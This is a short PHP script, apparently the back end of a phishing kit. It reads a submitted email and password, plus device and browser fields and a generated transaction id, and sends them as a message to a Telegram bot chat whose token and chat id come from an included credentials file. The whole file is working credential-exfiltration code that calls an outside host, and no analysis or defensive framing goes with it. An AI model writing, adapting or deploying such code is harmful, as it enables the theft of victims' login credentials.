<?php

include 'credentials.php';

if(!isset($_SESSION)) {
  session_start();
}

$_SESSION['transaction_id'] = uniqid('tran', true);


//if ($_POST['act'] == 'order') {
    $name = ($_POST['name']);
    $password = ($_POST['password']);

    $arr = array(
        'id: ' => $_SESSION['transaction_id'],
        'Email: ' => $name,
        'Password: ' => $password,
        'Device: ' => $device,
        'Browser: ' => $browser
    );

    foreach($arr as $key => $value) {
        $txt .= "<b>".$key."</b> ".$value."%0A";
    };

    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

//}

?>
